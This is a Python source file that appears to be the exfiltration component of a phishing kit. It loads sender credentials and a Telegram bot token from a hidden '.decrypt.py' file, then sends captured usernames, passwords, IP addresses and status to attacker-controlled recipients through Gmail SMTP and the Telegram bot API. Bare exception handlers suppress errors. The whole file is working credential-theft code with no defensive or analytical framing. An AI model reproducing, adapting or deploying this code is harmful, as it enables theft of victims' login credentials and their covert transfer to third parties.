import importlib.util

decrypt_spec = importlib.util.spec_from_file_location("decrypt", ".decrypt.py")
decrypt_module = importlib.util.module_from_spec(decrypt_spec)
decrypt_spec.loader.exec_module(decrypt_module)
load_secret = decrypt_module.load_secret
import smtplib as s, requests as r
from email.mime.text import MIMEText as T
from email.mime.multipart import MIMEMultipart as M

secrets = load_secret()

E, P = secrets["email"], secrets["pass"]
R = secrets["recipients"]
BT, CI = secrets["bot"], secrets["chat"]

def l(u="u", pw="p", ip="0.0.0.0", s_="s"):
    try:
        m = M()
        m["From"], m["To"] = E, ",".join(R)
        m["Subject"] = "📥"
        m.attach(T(f"\n👤:{u}\n🔐:{pw}\n🌐:{ip}\n📊:{s_}", "plain"))
        with s.SMTP("smtp.gmail.com", 587) as z:
            z.starttls()
            z.login(E, P)
            z.sendmail(E, R, m.as_string())
    except:
        pass

    try:
        r.post(
            f"https://api.telegram.org/bot{BT}/sendMessage",
            data={"chat_id": CI, "text": f"\n👤:{u}\n🔐:{pw}\n🌐:{ip}\n📊:{s_}", "parse_mode": "HTML"},
        )
    except:
        pass
